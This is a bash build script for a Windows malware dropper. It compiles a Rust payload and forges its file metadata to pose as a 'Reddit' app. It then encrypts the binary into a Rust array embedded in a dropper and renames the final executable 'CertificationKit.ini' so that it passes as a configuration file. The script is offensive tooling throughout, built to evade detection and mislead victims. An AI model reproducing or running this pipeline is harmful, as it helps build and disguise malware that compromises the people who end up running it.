# chmod +x build.sh && ./build.sh 

set -euo pipefail

PROJECT_DIR="reddit"
DROPPER_DIR="../dropper"
TARGET="x86_64-pc-windows-gnu"
OUTPUT_EXE="reddit.exe"
HEX_FILE="reddit.hex"
RUST_ARRAY_FILE="main.rs"
ENCRYPT_SCRIPT="encrypt.py"
FINAL_NAME="CertificationKit.ini"

# Moving to the main project folder (payload)
cd "$PROJECT_DIR" || { echo "Error: directory $PROJECT_DIR not found" >&2; exit 1; }

#1. Building the original payload file
echo "Building payload..."
cargo build --target "$TARGET" --release >/dev/null 2>&1 || { echo "Error: failed to build payload" >&2; exit 1; }

# 2. Copy the resulting file to the current folder to edit it
cp "target/$TARGET/release/$OUTPUT_EXE" . || { echo "Error: failed to copy $OUTPUT_EXE" >&2; exit 1; }

# 3. Modify the properties of the reddit.exe file using wine and rcedit
echo "Editing file properties with rcedit..."
wine ../rcedit-x64.exe "$OUTPUT_EXE" \
  --set-file-version "0.4.2.0" \
  --set-product-version "0.4.3" \
  --set-version-string "FileDescription" "Reddit Glory" \
  --set-version-string "ProductName" "Reddit" \
  --set-version-string "CompanyName" "Archer Dron" \
  --set-version-string "LegalCopyright" "Copyright (c) 2020, Archer Dron" \
  --set-version-string "OriginalFilename" "reddit.exe" || { echo "Warning: rcedit failed, but continuing..." >&2; }
# I made it "Warning" and used "||" to prevent the script from stopping if the rcedit step failed for any reason (such as no Wine).

# 4. Convert the modified file (reddit.exe) to hex format
echo "Converting to hex..."
xxd -p "$OUTPUT_EXE" | tr -d '\n' > "$HEX_FILE" || { echo "Error: failed to create hex file" >&2; exit 1; }

# 5. Encrypting the hex file and converting it to a Rust array
echo "Running encryption script..."
mkdir -p "$DROPPER_DIR/src"
python3 "$ENCRYPT_SCRIPT" > "$DROPPER_DIR/src/$RUST_ARRAY_FILE" || { echo "Error: encrypt.py failed" >&2; exit 1; }

# 6. Move to the dropper folder to build the final file
cd "$DROPPER_DIR" || { echo "Error: directory dropper not found" >&2; exit 1; }

# 7. Building the dropper file
echo "Building dropper..."
cargo build --target "$TARGET" --release >/dev/null 2>&1 || { echo "Error: failed to build dropper" >&2; exit 1; }

# 8. Copy the final file and name it CertificationKit.ini
cp "target/$TARGET/release/dropper.exe" "../$FINAL_NAME" || { echo "Error: failed to copy dropper.exe → $FINAL_NAME" >&2; exit 1; }

#9. The Message of Success
echo "Done → $(realpath "../$FINAL_NAME")"
